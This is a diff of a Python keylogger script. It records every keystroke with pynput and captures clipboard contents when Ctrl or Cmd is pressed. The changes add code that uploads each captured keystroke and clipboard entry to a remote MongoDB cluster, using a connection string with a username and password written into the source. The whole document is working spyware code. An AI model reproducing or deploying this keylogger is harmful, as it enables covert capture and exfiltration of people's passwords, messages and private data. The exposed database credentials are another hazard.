@@ -1,32 +1,48 @@
 from pynput.keyboard import Key, Listener
 import logging
+from pymongo import MongoClient
+import json
 import os
-import pyperclip  # To access clipboard
+import pyperclip
 
-# Define the directory where the log file will be saved
-log_dir = r"/Users/toheed/Projects/keylogger/"
+
+mongo_client = MongoClient("mongodb+srv://kgrcet:kgrcet123@cluster0.9ruwq.mongodb.net/")  
+db = mongo_client["keylogger_db"]
+collection = db["logs_kgrcet"]  
+
+log_dir = os.getcwd()
 log_file = os.path.join(log_dir, "keyLog.txt")
 
-# Ensure the log directory exists
+
 if not os.path.exists(log_dir):
     os.makedirs(log_dir)
 
-# Configure logging settings
-logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')
+logging.basicConfig(
+    filename=log_file, level=logging.DEBUG, format="%(asctime)s: %(message)s"
+)
+
+
+def log_to_mongo(log_entry):
+    try:
+        collection.insert_one(log_entry)
+    except Exception as e:
+        print(f"Error saving log to MongoDB: {e}")
+
 
 def on_press(key):
-    try:
-        # Log the key press
-        logging.info(str(key))
-        print(key)
-        
-        # Check for clipboard content when Ctrl+C or Command+C is pressed
-        if key == Key.ctrl_l or key == Key.cmd:
-            clipboard_content = pyperclip.paste()  # Get the current clipboard content
-            logging.info(f'Clipboard copied: {clipboard_content}')
-            print(f'Clipboard copied: {clipboard_content}')
-    except Exception as e:
-        print(f"Error logging key or clipboard: {e}")
+    log_entry = {"key": str(key), "type": "key_press"}
+    
+    log_to_mongo(log_entry)
+    logging.info(str(key))
+    
+    if key == Key.ctrl_l or key == Key.cmd:
+        clipboard_content = pyperclip.paste()
+        log_entry = {"clipboard": clipboard_content, "type": "clipboard"}
+
+        log_to_mongo(log_entry)
+        logging.info(f"Clipboard copied: {clipboard_content}")
+
+
 
 # Set up listener to capture keystrokes
 with Listener(on_press=on_press) as listener:
